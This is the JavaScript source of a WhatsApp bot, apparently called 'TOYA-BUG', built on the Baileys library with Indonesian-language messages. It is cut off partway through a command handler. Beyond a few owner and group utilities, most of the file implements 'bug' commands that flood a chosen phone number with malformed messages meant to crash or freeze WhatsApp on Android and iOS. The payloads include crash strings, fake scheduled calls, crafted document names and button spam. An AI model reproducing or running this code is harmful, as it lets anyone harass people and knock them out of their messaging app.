require('./temp/config')
const { downloadContentFromMessage, makeInMemoryStore, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const { isUrl, sleep, await, getGroupAdmins, fetchJson } = require('./lib/myfunc.js')

const fs = require('fs')
const axios = require("axios")
const util = require("util")
const chalk = require('chalk')
const fetch = require('node-fetch')
const ms = require("parse-ms");
const { exec, spawn, execSync } = require("child_process")

ownerNumberr = global.ownerNumber
ownerNamee = global.ownerName
botNamee = global.botName

// Bot Settings
Leccy_Auto_Typing = global.Auto_Typing
Leccy_Auto_Recording = global.Auto_Recording
Leccy_Auto_RecordType = global.Auto_RecordType
Leccy_Auto_ReadPesan = global.Auto_ReadPesan

botautoaichat = global.AutoBotAiChat
tiktokauto = global.TiktokAutoDownload

let { loc } = require('./temp/kroco/loc')
let { krocox1 } = require('./temp/kroco/krocox1')
let { krocox3 } = require('./temp/kroco/krocox3')
let { krocox4 } = require('./temp/kroco/krocox4')
let { krocox6 } = require('./temp/kroco/krocox6')
let { mdelay } = require('./temp/kroco/mdelay')
let { telapreta3 } = require('./temp/kroco/telapreta3')
let { travadoc } = require('./temp/kroco/travadoc')

// hw
let { cttl } = require('./temp/kroco/cttl')
let { ios1 } = require('./temp/kroco/ios1')
let { bugui } = require('./temp/kroco/bugui')
let { bugui2 } = require('./temp/kroco/bugui2')

const teks_proses = '_Your request is being processed⏳_'

let premium = JSON.parse(fs.readFileSync('./temp/db/prem.json'))
virgam = fs.readFileSync('./temp/image/virgam.jpg')
viraud = fs.readFileSync('./temp/audio/viraud.mp3')

module.exports = async (leccy, msg, store) => {
try {
const { fromMe, isBaileys, isQuotedMsg, quotedMsg, mentioned } = msg
if (msg.key && msg.key.remoteJid === 'status@broadcast') return
const type = getContentType(msg.message)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const quoted = type == 'extendedTextMessage' && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'documentMessage') && msg.message.documentMessage.caption ? msg.message.documentMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type == 'buttonsResponseMessage' && msg.message.buttonsResponseMessage.selectedButtonId) ? msg.message.buttonsResponseMessage.selectedButtonId : (type == 'templateButtonReplyMessage') && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : ''
const chats = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.'
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const dn = args.join(' ')
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = leccy.user.id.split(':')[0]
const sender = msg.key.fromMe ? (leccy.user.id.split(':')[0]+'@s.whatsapp.net' || leccy.user.id) : (msg.key.participant || msg.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = msg.pushName || `${senderNumber}`

const isSaya = botNumber.includes(senderNumber)
const isLeccy = global.ownerNumber.includes(senderNumber) || isSaya
const isPremium = [global.ownerNumber, ...premium].includes(senderNumber) || isSaya

const groupMetadata = isGroup ? await leccy.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(`${botNumber}@s.whatsapp.net`) || false
const isGroupAdmins = groupAdmins.includes(sender) || false

const hitPath = './temp/db/hit.json'

const runtime = function(seconds) {
var seconds = Number(seconds);
var d = Math.floor(seconds / (3600 * 24));
var h = Math.floor(seconds % (3600 * 24) / 3600);
var m = Math.floor(seconds % 3600 / 60);
var s = Math.floor(seconds % 60);
var dDisplay = d > 0 ? d + (d == 1 ? " Hari, " : " Hari, ") : "";
var hDisplay = h > 0 ? h + (h == 1 ? " Jam, " : " Jam, ") : "";
var mDisplay = m > 0 ? m + (m == 1 ? " Menit, " : " Menit, ") : "";
var sDisplay = s > 0 ? s + (s == 1 ? " Detik" : " Detik") : "";
return dDisplay + hDisplay + mDisplay + sDisplay;
}

const jsonformat = async(string) => {
return JSON.stringify(string, null, 2)
}

const inibug = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `*MarkZuckerberg*`
}}}

const myqtd = {"key": {   "fromMe": false,"participant":"0@s.whatsapp.net",   "remoteJid": 'status@broadcast' },message: {"extendedTextMessage": { "text": `${runtime(process.uptime())}` }}}

const reply = async(teks) => {
await leccy.sendMessage(from,{text: teks},{quoted:msg})
}

const santet_andro_teks = async(targettt,jumelah) => {
for (let i = 0; i < jumelah; i++) {
leccy.sendMessage(targettt,{text:'_*💣‼️W̥ͦḀͦR̥ͦN̥ͦI̥ͦN̥ͦG̥ͦ‼️💣*_'},{quoted:inibug})
leccy.sendMessage(targettt,{text:'_*💣‼️W̥ͦḀͦR̥ͦN̥ͦI̥ͦN̥ͦG̥ͦ‼️💣*_'},{quoted:inibug})
leccy.sendMessage(targettt,{text:'_*💣‼️W̥ͦḀͦR̥ͦN̥ͦI̥ͦN̥ͦG̥ͦ‼️💣*_'},{quoted:inibug})
leccy.sendMessage(targettt,{text:'_*💣‼️W̥ͦḀͦR̥ͦN̥ͦI̥ͦN̥ͦG̥ͦ‼️💣*_'},{quoted:inibug})
leccy.sendMessage(targettt,{text:'_*💣‼️W̥ͦḀͦR̥ͦN̥ͦI̥ͦN̥ͦG̥ͦ‼️💣*_'},{quoted:inibug})
leccy.sendMessage(targettt,{text:'_*💣‼️W̥ͦḀͦR̥ͦN̥ͦI̥ͦN̥ͦG̥ͦ‼️💣*_'},{quoted:inibug})
leccy.sendMessage(targettt,{text:'_*💣‼️W̥ͦḀͦR̥ͦN̥ͦI̥ͦN̥ͦG̥ͦ‼️💣*_'},{quoted:inibug})
leccy.sendMessage(targettt,{text:'_*💣‼️W̥ͦḀͦR̥ͦN̥ͦI̥ͦN̥ͦG̥ͦ‼️💣*_'},{quoted:inibug})
leccy.sendMessage(targettt,{text:'_*💣‼️W̥ͦḀͦR̥ͦN̥ͦI̥ͦN̥ͦG̥ͦ‼️💣*_'},{quoted:inibug})
leccy.sendMessage(targettt,{text:'_*💣‼️W̥ͦḀͦR̥ͦN̥ͦI̥ͦN̥ͦG̥ͦ‼️💣*_'},{quoted:inibug})
}}

const sendteks = async(teks) => {
leccy.sendMessage(from,{text:teks},{quoted:myqtd})
}

const react = async(teks) => {
leccy.sendMessage(from, {react: {text: teks, key: msg.key }})
}

const sendvidio = async(vid, cap) => {
leccy.sendMessage(sender, {video: {url: vid}, caption: cap},{quoted:msg})
}

const sendimage = async(img, cap) => {
leccy.sendMessage(sender, {image: {url: img}, caption: cap},{quoted:msg})
}

const sendaudio = async(myurl, judul) => {
leccy.sendMessage(sender, {document: {url: myurl}, fileName: judul+'.mp3', mimetype: 'audio/mp3'}, {quoted:msg})
}

async function santet_andro_call(taregettt,jumelah) {
for (let i = 0; i < jumelah; i++) {
var scheduledCallCreationMessage = generateWAMessageFromContent(taregettt, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": 999999999999,
"title": ios1+mdelay,
}
}), { userJid: taregettt, quoted : msg})
leccy.relayMessage(taregettt, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}}

async function docu1(taregettt,jumelah) {
for (let i = 0; i < jumelah; i++) {
leccy.sendMessage(taregettt, {document: {url: './temp/config.js'}, mimetype: `image/null`, fileName: `Ƭσʏαβʋɢ.${travadoc}`, caption: `Ƭσʏαβʋɢ.${travadoc}`, }, {quoted: inibug})
leccy.sendMessage(taregettt, {document: {url: './temp/config.js'}, mimetype: `image/null`, fileName: `Ƭσʏαβʋɢ.${krocox1}`, caption: `Ƭσʏαβʋɢ.${krocox1}`, }, {quoted: inibug})
leccy.sendMessage(taregettt, {document: {url: './temp/config.js'}, mimetype: `image/null`, fileName: `Ƭσʏαβʋɢ.${krocox3}`, caption: `Ƭσʏαβʋɢ.${krocox3}`, }, {quoted: inibug})
}}

async function docu2(taregettt,jumelah) {
for (let i = 0; i < jumelah; i++) {
leccy.sendMessage(taregettt, {document: {url: './temp/config.js'}, mimetype: `image/null`, fileName: `Ƭσʏαβʋɢ.${ios1}`, caption: `Ƭσʏαβʋɢ.${ios1}`, }, {quoted: inibug})
leccy.sendMessage(taregettt, {document: {url: './temp/config.js'}, mimetype: `image/null`, fileName: `Ƭσʏαβʋɢ.${bugui}`, caption: `Ƭσʏαβʋɢ.${bugui}`, }, {quoted: inibug})
leccy.sendMessage(taregettt, {document: {url: './temp/config.js'}, mimetype: `image/null`, fileName: `Ƭσʏαβʋɢ.${bugui2}`, caption: `Ƭσʏαβʋɢ.${bugui2}`, }, {quoted: inibug})
}}

async function docu3(taregettt,jumelah) {
for (let i = 0; i < jumelah; i++) {
leccy.sendMessage(taregettt, {document: {url: './temp/config.js'}, mimetype: `image/null`, fileName: `Ƭσʏαβʋɢ.${krocox4}`, caption: `Ƭσʏαβʋɢ.${krocox4}`, }, {quoted: inibug})
leccy.sendMessage(taregettt, {document: {url: './temp/config.js'}, mimetype: `image/null`, fileName: `Ƭσʏαβʋɢ.${krocox6}`, caption: `Ƭσʏαβʋɢ.${krocox6}`, }, {quoted: inibug})
leccy.sendMessage(taregettt, {document: {url: './temp/config.js'}, mimetype: `image/null`, fileName: `Ƭσʏαβʋɢ.${mdelay}`, caption: `Ƭσʏαβʋɢ.${mdelay}`, }, {quoted: inibug})
}}

function sendBugButton(target,jumlahnya) {
for (let i = 0; i < jumlahnya; i++) {
leccy.sendMessage(target, {text: "MarkZuckerberg", 
templateButtons: [
{ callButton: { displayText: `Click Here!`, phoneNumber: ``}},
{ callButton: { displayText: `Click Here!`, phoneNumber: ``}},
{ urlButton: { displayText: `Click Here!`, url: `https://www.whatsapp.com/otp/copy/${target}`}},
{ quickReplyButton: { displayText: `Click Here!`, id: ``}},
{ quickReplyButton: { displayText: `Click Here!`, id: ``}},
{ quickReplyButton: { displayText: `Click Here!`, id: ``}},
]})
}}

async function santet_ios_satu(taregettt,jumelah) {
for (let i = 0; i < jumelah; i++) {
leccy.relayMessage(taregettt,{
extendedTextMessage:{
"text":'.',
"contextInfo": {
"stanzaId": taregettt,
"participant": taregettt,
"quotedMessage": {
"conversation": krocox1
},
"disappearingMode": {
"initiator": "CHANGED_IN_CHAT",
"trigger": "CHAT_SETTING"
}
},
"inviteLinkGroupTypeV2": "DEFAULT"
}
}, {messageId: null})
}}

async function santet_ios_dua(taregettt,jumelah) {
for (let i = 0; i < jumelah; i++) {
leccy.relayMessage(taregettt,{
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000)
}},{})
}}

function mentions(teks, mems = [], id) {
if (id == null || id == undefined || id == false) {
let res = leccy.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
return res
} else {
let res = leccy.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
return res
}}

if (Leccy_Auto_Typing) {
leccy.sendPresenceUpdate('composing', from)
}

if (Leccy_Auto_Recording) {
leccy.sendPresenceUpdate('recording', from)
}

if (Leccy_Auto_ReadPesan) {
leccy.readMessages([msg.key])
}

let allhitPath = './temp/db/lasthit.json'
let db_lasthit = JSON.parse(fs.readFileSync(allhitPath))

if (isGroup) {
if (msg.key.fromMe) return
console.log(chalk.bgBlack(chalk.redBright('\n===========================================\n')))
console.log(chalk.black(chalk.white("Group Chat :")))
console.log(chalk.black(chalk.cyan("- Message :")), chalk.black(chalk.greenBright(body || type)) + '\n' + chalk.magenta('- From :'), chalk.green(msg.pushName), chalk.yellow(sender.split('@')[0]) + '\n' + chalk.blueBright('=> in'), chalk.green(groupName, from))
} else {
if (msg.key.fromMe) return
console.log(chalk.bgBlack(chalk.redBright('\n===========================================\n')))
console.log(chalk.black(chalk.white("Private Chat :")))
console.log(chalk.bgBlack(chalk.cyan("- Message :")), chalk.black(chalk.greenBright(body || type)) + '\n' + chalk.magenta('- From :'), chalk.green(msg.pushName), chalk.yellow(sender.split('@')[0]) + '\n')
}

switch (command) {
case 'test':
sendBugButton(from,1)
break
case 'block':
if (!isLeccy) return reply(`*Khusus Owner Leccy!*`)
blockw = q.split("|")[0].replace(/[^0-9]/g, '')
let cekblok = await leccy.onWhatsApp(blockw + '@s.whatsapp.net')
if (cekblok.length == 0) return reply(`_Enter A Valid And Registered Number On WhatsApp!!_`)
let iniblock = blockw + '@s.whatsapp.net'
await leccy.updateBlockStatus(iniblock, 'block').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
break
case 'unblock':
if (!isLeccy) return reply(`*Khusus Owner Leccy!*`)
blockww = q.split("|")[0].replace(/[^0-9]/g, '')
let cekblokk = await leccy.onWhatsApp(blockww + '@s.whatsapp.net')
if (cekblokk.length == 0) return reply(`_Enter A Valid And Registered Number On WhatsApp!!_`)
let iniblockk = blockww + '@s.whatsapp.net'
await leccy.updateBlockStatus(iniblockk, 'unblock').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
break
case 'leave':
if (!isLeccy) return reply(`*Khusus Owner Leccy!*`)
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
reply('Bye Everyone.')
await leccy.groupLeave(from)
break
case 'shutdown':
if (!isLeccy) return reply(`*Khusus Owner Leccy!*`)
reply(`Goodbye🖐`)
await sleep(3000)
process.exit()
break
case 'restart':
if (!isLeccy) return reply(`*Khusus Owner Leccy!*`)
reply('In Process...')
exec('pm2 restart all')
break
case 'listprem':{
if (!isLeccy) return reply(`*Khusus Owner Leccy!*`)
let owner = JSON.parse(fs.readFileSync('./temp/db/prem.json'))
if (owner.length == 0) return reply('_Tidak Ada Users Premium!!_')
var teksssss = `_*LIST USER PREMIUM*_\n*Total User :* ${premium.length}\n\n`
var no = 1
for (let i of owner){
teksssss += `User : ${no++}\nNumber : @${i}\n\n`
}
leccy.sendTextWithMentions(from, teksssss, msg)
}
break
case 'addprem':
if (!isLeccy) return reply(`*Khusus Owner Leccy!*`)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 628xxxxxxxx`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await leccy.onWhatsApp(bnnd + '@s.whatsapp.net')
if (ceknye.length == 0) return reply(`_Enter A Valid And Registered Number On WhatsApp!!_`)
if (premium.includes(bnnd)) return reply("_Nomor Tersebut Sudah Premium !!_")
premium.push(bnnd)
fs.writeFileSync('./temp/db/prem.json', JSON.stringify(premium))
let addpremm = bnnd+'@s.whatsapp.net'
mentions(`*Sukses Menambahkan ${addpremm.split('@')[0]} Ke Database Users Premium*`, [addpremm])
break
case 'delprem':
if (!isLeccy) return reply(`*Khusus Owner Leccy!*`)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 628xxxxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = premium.indexOf(ya)
if (!premium.includes(ya)) return reply("_Gagal Menghapus Dari Database, Nomor Tersebut Bukan Users Premium!!_")
premium.splice(unp, 1)
fs.writeFileSync('./temp/db/prem.json', JSON.stringify(premium))
let delpremm = ya+'@s.whatsapp.net'
mentions(`*Sukses Menghapus ${delpremm.split('@')[0]} Didatabase Users Premium*`, [delpremm])
break
case 'menu':
case 'help':
sendteks(`▱▰▱▰▱「 🅣🅞🅨🅐-🅑🅤🅖 」▱▰▱▰▱

 - ɮօTռǟʍɛ : ${global.botName}
 - օառɛʀռǟʍɛ : ${global.ownerName}
 - ʋɛʀֆɨօռ : 𝚃𝚘𝚢𝚊𝙱𝚄𝙶ᵛ³

*LIST MENU OWNER*
▢ ${prefix}join
▢ ${prefix}restart
▢ ${prefix}shutdown
▢ ${prefix}addprem
▢ ${prefix}delprem
▢ ${prefix}listprem
▢ ${prefix}unblock
▢ ${prefix}block
▢ ${prefix}leave

*LIST MENU GROUP*
▢ ${prefix}kick
▢ ${prefix}open
▢ ${prefix}close
▢ ${prefix}linkgc
▢ ${prefix}linkgrup
▢ ${prefix}revoke
▢ ${prefix}hidetag
▢ ${prefix}promote
▢ ${prefix}demote
▢ ${prefix}setname
▢ ${prefix}setdesc
▢ ${prefix}editinfo

*MENU BUG NUMBER*
▢ ${prefix}ios
▢ ${prefix}crashios
▢ ${prefix}bomios
▢ ${prefix}xios
▢ ${prefix}bugios
▢ ${prefix}pc
▢ ${prefix}vip
▢ ${prefix}bug
▢ ${prefix}troli
▢ ${prefix}crash
▢ ${prefix}spam
▢ ${prefix}lecbug
▢ ${prefix}travas
▢ ${prefix}santet
▢ ${prefix}caller
▢ ${prefix}delay
▢ ${prefix}turulec
▢ ${prefix}lecgas

*MENU BUG GROUP*
▢ ${prefix}gasgc
▢ ${prefix}bomgc
▢ ${prefix}buggc
▢ ${prefix}travagc
▢ ${prefix}crashgc

▱▰▱▰▱▰▱▰▱▰▱▰▱▰
  © c̫̾я̾є̾ѧ̾ṭ̾є̾Ԁ̾ ɞ̾ʏ̾ ʟ̾є̾c̫̾c̫̾ʏ̾ȏ̾ғ̾c̫̾
▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱`)
break
case 'crashios':
case 'bomios':
case 'xios':
case 'bugios':
case 'ios':{
if (!isLeccy && !isPremium) return reply (`*Fitur Ini Khusus Member Premium!*`)
if (!q) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5\n\n©leccyofc`)
let orang = q.split(',')[0]
let jumlah = q.split(',')[1] ? q.split(',')[1] : '1'
if (!orang) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5\n\n©leccyofc`)
if (isNaN(parseInt(jumlah))) return reply('Jumlah wajib angka!!')
let targetnya = orang.replace(/[^0-9]/g, '')
let inijumlah = `${encodeURI(jumlah)}`
var cekap = await leccy.onWhatsApp(targetnya + '@s.whatsapp.net')
let tareget = targetnya+'@s.whatsapp.net'
if (cekap.length == 0) return reply(`Nomor Tersebut Tidak Terdaftar Di WhatsApp`)
mentions(`*Bug Sedang Dikirim Ke Target @${tareget.split('@')[0]}*\n*Mohon Tunggu Sebentar!*\n\n*Note:* _Proses Pengiriman Bug Sekitar 1-10 Menit, Tergantung Jumlah Spam Bug Yang Dikirim._\n\n© 𝚃𝚘𝚢𝚊𝙱𝚄𝙶ᵛ¹`, [tareget])
await sleep(2000)
santet_ios_satu(tareget,inijumlah)
santet_ios_dua(tareget,inijumlah)
mentions(`*BERHASIL MENGIRIM ${command.toUpperCase()}*\n*TARGET :* @${tareget.split('@')[0]}\n*JUMLAH SPAM :* ${inijumlah}×\n\n*_NOTE :_*\n*HARAP JEDA 1 MENIT*\n*AGAR BOT TIDAK KEBAN*`, [tareget])
}
break
case 'turulec':
case 'lecgas':{
if (!isLeccy && !isPremium) return reply (`*Fitur Ini Khusus Member Premium!*`)
if (!q) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5\n\n©leccyofc`)
let orang = q.split(',')[0]
let jumlah = q.split(',')[1] ? q.split(',')[1] : '1'
if (!orang) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5\n\n©leccyofc`)
if (isNaN(parseInt(jumlah))) return reply('Jumlah wajib angka!!')
let targetnya = orang.replace(/[^0-9]/g, '')
let inijumlah = `${encodeURI(jumlah)}`
var cekap = await leccy.onWhatsApp(targetnya + '@s.whatsapp.net')
let tareget = targetnya+'@s.whatsapp.net'
if (cekap.length == 0) return reply(`Nomor Tersebut Tidak Terdaftar Di WhatsApp`)
mentions(`*Bug Sedang Dikirim Ke Target @${tareget.split('@')[0]}*\n*Mohon Tunggu Sebentar!*\n\n*Note:* _Proses Pengiriman Bug Sekitar 1-10 Menit, Tergantung Jumlah Spam Bug Yang Dikirim._\n\n© 𝚃𝚘𝚢𝚊𝙱𝚄𝙶ᵛ¹`, [tareget])
await sleep(2000)
docu1(tareget,inijumlah)
docu2(tareget,inijumlah)
docu3(tareget,inijumlah)
mentions(`*BERHASIL MENGIRIM ${command.toUpperCase()}*\n*TARGET :* @${tareget.split('@')[0]}\n*JUMLAH SPAM :* ${inijumlah}×\n\n*_NOTE :_*\n*HARAP JEDA 1 MENIT*\n*AGAR BOT TIDAK KEBAN*`, [tareget])
}
break
case 'santet':
case 'travas':
case 'crash':{
if (!isLeccy && !isPremium) return reply (`*Fitur Ini Khusus Member Premium!*`)
if (!q) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5\n\n©leccyofc`)
let orang = q.split(',')[0]
let jumlah = q.split(',')[1] ? q.split(',')[1] : '1'
if (!orang) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5\n\n©leccyofc`)
if (isNaN(parseInt(jumlah))) return reply('Jumlah wajib angka!!')
let targetnya = orang.replace(/[^0-9]/g, '')
let inijumlah = `${encodeURI(jumlah)}`
var cekap = await leccy.onWhatsApp(targetnya + '@s.whatsapp.net')
let tareget = targetnya+'@s.whatsapp.net'
if (cekap.length == 0) return reply(`Nomor Tersebut Tidak Terdaftar Di WhatsApp`)
mentions(`*Bug Sedang Dikirim Ke Target @${tareget.split('@')[0]}*\n*Mohon Tunggu Sebentar!*\n\n*Note:* _Proses Pengiriman Bug Sekitar 1-10 Menit, Tergantung Jumlah Spam Bug Yang Dikirim._\n\n© 𝚃𝚘𝚢𝚊𝙱𝚄𝙶ᵛ¹`, [tareget])
await sleep(2000)
docu1(tareget,inijumlah)
sendBugButton(tareget,2)
mentions(`*BERHASIL MENGIRIM ${command.toUpperCase()}*\n*TARGET :* @${tareget.split('@')[0]}\n*JUMLAH SPAM :* ${inijumlah}×\n\n*_NOTE :_*\n*HARAP JEDA 1 MENIT*\n*AGAR BOT TIDAK KEBAN*`, [tareget])
}
break
case 'troli':
case 'lecbug':{
if (!isLeccy && !isPremium) return reply (`*Fitur Ini Khusus Member Premium!*`)
if (!q) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5\n\n©leccyofc`)
let orang = q.split(',')[0]
let jumlah = q.split(',')[1] ? q.split(',')[1] : '1'
if (!orang) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5\n\n©leccyofc`)
if (isNaN(parseInt(jumlah))) return reply('Jumlah wajib angka!!')
let targetnya = orang.replace(/[^0-9]/g, '')
let inijumlah = `${encodeURI(jumlah)}`
var cekap = await leccy.onWhatsApp(targetnya + '@s.whatsapp.net')
let tareget = targetnya+'@s.whatsapp.net'
if (cekap.length == 0) return reply(`Nomor Tersebut Tidak Terdaftar Di WhatsApp`)
mentions(`*Bug Sedang Dikirim Ke Target @${tareget.split('@')[0]}*\n*Mohon Tunggu Sebentar!*\n\n*Note:* _Proses Pengiriman Bug Sekitar 1-10 Menit, Tergantung Jumlah Spam Bug Yang Dikirim._\n\n© 𝚃𝚘𝚢𝚊𝙱𝚄𝙶ᵛ¹`, [tareget])
await sleep(2000)
docu2(tareget,inijumlah)
sendBugButton(tareget,2)
mentions(`*BERHASIL MENGIRIM ${command.toUpperCase()}*\n*TARGET :* @${tareget.split('@')[0]}\n*JUMLAH SPAM :* ${inijumlah}×\n\n*_NOTE :_*\n*HARAP JEDA 1 MENIT*\n*AGAR BOT TIDAK KEBAN*`, [tareget])
}
break
case 'bom':
case 'vip':{
if (!isLeccy && !isPremium) return reply (`*Fitur Ini Khusus Member Premium!*`)
if (!q) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5\n\n©leccyofc`)
let orang = q.split(',')[0]
let jumlah = q.split(',')[1] ? q.split(',')[1] : '1'
if (!orang) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5\n\n©leccyofc`)
if (isNaN(parseInt(jumlah))) return reply('Jumlah wajib angka!!')
let targetnya = orang.replace(/[^0-9]/g, '')
let inijumlah = `${encodeURI(jumlah)}`
var cekap = await leccy.onWhatsApp(targetnya + '@s.whatsapp.net')
let tareget = targetnya+'@s.whatsapp.net'
if (cekap.length == 0) return reply(`Nomor Tersebut Tidak Terdaftar Di WhatsApp`)
mentions(`*Bug Sedang Dikirim Ke Target @${tareget.split('@')[0]}*\n*Mohon Tunggu Sebentar!*\n\n*Note:* _Proses Pengiriman Bug Sekitar 1-10 Menit, Tergantung Jumlah Spam Bug Yang Dikirim._\n\n© 𝚃𝚘𝚢𝚊𝙱𝚄𝙶ᵛ¹`, [tareget])
await sleep(2000)
docu3(tareget,inijumlah)
sendBugButton(initarget,1)
mentions(`*BERHASIL MENGIRIM ${command.toUpperCase()}*\n*TARGET :* @${tareget.split('@')[0]}\n*JUMLAH SPAM :* ${inijumlah}×\n\n*_NOTE :_*\n*HARAP JEDA 1 MENIT*\n*AGAR BOT TIDAK KEBAN*`, [tareget])
}
break
case 'caller':
case 'delay':{
if (!isLeccy && !isPremium) return reply (`*Fitur Ini Khusus Member Premium!*`)
if (!q) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5\n\n©leccyofc`)
let orang = q.split(',')[0]
let jumlah = q.split(',')[1] ? q.split(',')[1] : '1'
if (!orang) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5\n\n©leccyofc`)
if (isNaN(parseInt(jumlah))) return reply('Jumlah wajib angka!!')
let targetnya = orang.replace(/[^0-9]/g, '')
let inijumlah = `${encodeURI(jumlah)}`
var cekap = await leccy.onWhatsApp(targetnya + '@s.whatsapp.net')
let tareget = targetnya+'@s.whatsapp.net'
if (cekap.length == 0) return reply(`Nomor Tersebut Tidak Terdaftar Di WhatsApp`)
mentions(`*Bug Sedang Dikirim Ke Target @${tareget.split('@')[0]}*\n*Mohon Tunggu Sebentar!*\n\n*Note:* _Proses Pengiriman Bug Sekitar 1-10 Menit, Tergantung Jumlah Spam Bug Yang Dikirim._\n\n© 𝚃𝚘𝚢𝚊𝙱𝚄𝙶ᵛ¹`, [tareget])
await sleep(2000)
santet_andro_call(tareget,inijumlah)
sendBugButton(initarget,1)
mentions(`*BERHASIL MENGIRIM ${command.toUpperCase()}*\n*TARGET :* @${tareget.split('@')[0]}\n*JUMLAH SPAM :* ${inijumlah}×\n\n*_NOTE :_*\n*HARAP JEDA 1 MENIT*\n*AGAR BOT TIDAK KEBAN*`, [tareget])
}
break
case 'pc':
case 'bug':
case 'spam':{
if (!isLeccy && !isPremium) return reply (`*Fitur Ini Khusus Member Premium!*`)
if (!q) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5\n\n©leccyofc`)
let orang = q.split(',')[0]
let jumlah = q.split(',')[1] ? q.split(',')[1] : '1'
if (!orang) return reply(`*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${prefix+command} number,jumlah\n\n*Contoh:*\n${prefix+command} 628xxxx,5\n\n©leccyofc`)
if (isNaN(parseInt(jumlah))) return reply('Jumlah wajib angka!!')
let targetnya = orang.replace(/[^0-9]/g, '')
let inijumlah = `${encodeURI(jumlah)}`
var cekap = await leccy.onWhatsApp(targetnya + '@s.whatsapp.net')
